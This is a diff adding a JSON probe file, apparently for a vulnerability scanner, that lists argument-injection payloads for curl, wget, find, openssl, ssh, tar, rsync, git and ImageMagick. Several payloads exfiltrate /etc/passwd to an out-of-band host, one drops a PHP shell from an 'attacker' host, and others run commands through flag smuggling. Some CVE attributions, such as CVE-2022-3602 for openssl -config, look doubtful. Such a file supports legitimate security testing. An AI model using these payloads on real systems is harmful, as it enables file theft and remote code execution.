@@ -1,0 +1,227 @@
+{
+  "category": "argv_injection",
+  "description": "Argument injection — distinct from generic command injection. Application passes user input as an argument to a subprocess but doesn't validate flag-like prefixes. `-` / `--` / `@` smuggle behavior changes into commands the developer didn't intend (curl --upload-file, find -exec, openssl -config, ssh -oProxyCommand). PayloadsAllTheThings calls this out as its own surface; many CMDi-resistant apps fall to it.",
+  "contexts": {
+    "curl_upload_file": {
+      "description": "App calls curl with URL from user input. `--upload-file /etc/passwd attacker.com` makes curl PUT a local file to attacker. Matters when curl's working directory has readable secrets.",
+      "tech_match": [],
+      "param_match": ["url", "fetch", "callback", "import", "webhook", "image_url"],
+      "probes": [
+        {
+          "payload": "--upload-file /etc/passwd https://{{collaborator}}/",
+          "description": "If curl receives this as positional arg, file is uploaded to OOB callback. Collaborator interaction = confirmed.",
+          "matchers": [
+            {"type": "collaborator"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        },
+        {
+          "payload": "--config=https://{{collaborator}}/curlrc",
+          "description": "Force curl to load a remote config — config file can set any curl option including local file uploads",
+          "matchers": [
+            {"type": "collaborator"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        },
+        {
+          "payload": "-o /tmp/swk-curl-{{marker}}.out https://example.com",
+          "description": "-o redirects curl output to a file path attacker chose. With writable target, traversal to web-root → RCE chain.",
+          "matchers": [
+            {"type": "literal", "pattern": "swk-curl"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        }
+      ]
+    },
+    "wget_argv_smuggle": {
+      "description": "wget invoked with user-controlled URL. `--output-document` / `--use-server-timestamps=off` / `--no-check-certificate` are not as exploitable, but `--header=...` and `--post-file=` are.",
+      "tech_match": [],
+      "param_match": ["url", "fetch", "image_url"],
+      "probes": [
+        {
+          "payload": "--post-file=/etc/passwd https://{{collaborator}}/",
+          "description": "wget POSTs local file as request body — direct file exfil to OOB",
+          "matchers": [
+            {"type": "collaborator"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        },
+        {
+          "payload": "-O /var/www/html/swk-wget-{{marker}}.php https://attacker/shell.php",
+          "description": "-O writes downloaded content to a specific path — PHP shell drop if web-root writable",
+          "matchers": [
+            {"type": "literal", "pattern": "swk-wget"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        }
+      ]
+    },
+    "find_exec_smuggle": {
+      "description": "find called with user-controlled path or pattern argument. `-exec` triggers arbitrary command per file matched.",
+      "tech_match": [],
+      "param_match": ["file", "filename", "path", "name"],
+      "probes": [
+        {
+          "payload": ". -exec id {} ;",
+          "description": "find's -exec runs given command for each match. Injected via positional arg.",
+          "matchers": [
+            {"type": "literal", "pattern": "uid="},
+            {"type": "literal", "pattern": "gid="}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        }
+      ]
+    },
+    "openssl_config_load": {
+      "description": "openssl tool invoked with user-controlled args. `-config` loads attacker-supplied config file with engine_section etc. → arbitrary library load → RCE (CVE-2022-3602 chain on weak verification paths).",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "-config /tmp/attacker.cnf",
+          "description": "openssl -config loads OpenSSL config file. attacker.cnf with engine_section + dynamic_path = load arbitrary .so",
+          "matchers": [
+            {"type": "literal", "pattern": "openssl"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        }
+      ]
+    },
+    "ssh_proxycommand": {
+      "description": "ssh called with user-controlled hostname. `-oProxyCommand=...` runs arbitrary shell command before establishing connection. GitHub CVE-2017-1000117 (git-ssh ProxyCommand RCE).",
+      "tech_match": ["git", "ssh"],
+      "param_match": ["repo", "remote", "url", "host"],
+      "probes": [
+        {
+          "payload": "-oProxyCommand=touch /tmp/swk-ssh-{{marker}} -- attacker.com",
+          "description": "ProxyCommand runs `touch /tmp/swk-ssh-...` before ssh connect. Indicator file = confirmed.",
+          "matchers": [
+            {"type": "literal", "pattern": "swk-ssh"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        },
+        {
+          "payload": "ssh://-oProxyCommand=touch%20/tmp/swk-{{marker}}/x.git",
+          "description": "URL-embedded variant — git/composer/yarn parse ssh:// URLs and feed to ssh. -o prefix smuggles flag.",
+          "matchers": [
+            {"type": "literal", "pattern": "swk-"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        }
+      ]
+    },
+    "tar_dash_dash_to_command": {
+      "description": "GNU tar's --to-command='<cmd>' runs command per file extracted. If app uses tar to extract a user-provided archive name + accepts free-form arg, RCE.",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "--to-command=id",
+          "description": "tar --to-command spawns subprocess for each file in archive",
+          "matchers": [
+            {"type": "literal", "pattern": "uid="}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        }
+      ]
+    },
+    "rsync_e_flag": {
+      "description": "rsync's `-e` flag specifies remote shell. Injection of `-e \"sh -c '<cmd>'\"` makes rsync exec the command before transfer.",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "-e 'sh -c \"id\"' attacker.com:/tmp/x .",
+          "description": "rsync -e overrides remote-shell command. Local command runs before connection attempt.",
+          "matchers": [
+            {"type": "literal", "pattern": "uid="}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        }
+      ]
+    },
+    "git_clone_upload_pack": {
+      "description": "git clone with attacker URL. ext:: helper or upload-pack option override = code execution. CVE-2017-1000117 family.",
+      "tech_match": ["git"],
+      "param_match": ["repo", "remote", "clone_url"],
+      "probes": [
+        {
+          "payload": "ext::sh -c 'id'",
+          "description": "git ext:: helper runs shell command instead of contacting remote",
+          "matchers": [
+            {"type": "literal", "pattern": "uid="}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {}
+        },
+        {
+          "payload": "--upload-pack='id #' .",
+          "description": "git --upload-pack runs the given command instead of git-upload-pack",
+          "matchers": [
+            {"type": "literal", "pattern": "uid="}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        }
+      ]
+    },
+    "imagemagick_argv": {
+      "description": "convert/magick with user filename can be smuggled via `@<filename>` (read commands from file) or pipeline operators inside filenames.",
+      "tech_match": ["imagemagick"],
+      "param_match": ["image", "filename", "upload"],
+      "probes": [
+        {
+          "payload": "@/tmp/swk-im-{{marker}}.cmd",
+          "description": "@<file> reads commands from file. Combined with attacker-controlled file create → arbitrary IM op execution.",
+          "matchers": [
+            {"type": "literal", "pattern": "swk-im"}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        }
+      ]
+    },
+    "argv_zero_smuggle": {
+      "description": "Some apps invoke `sh -c \"<cmd> $USER_INPUT\"` and tester smuggles via argv[0] — `nc -e /bin/sh attacker.com 4444` would be detected, but `--help; <real cmd>` works because of how shell parses argv0 in -c.",
+      "tech_match": [],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "x | id",
+          "description": "Pipeline injection where filter prohibits ; but allows |. Look at output for command execution.",
+          "matchers": [
+            {"type": "literal", "pattern": "uid="}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        }
+      ]
+    }
+  }
+}
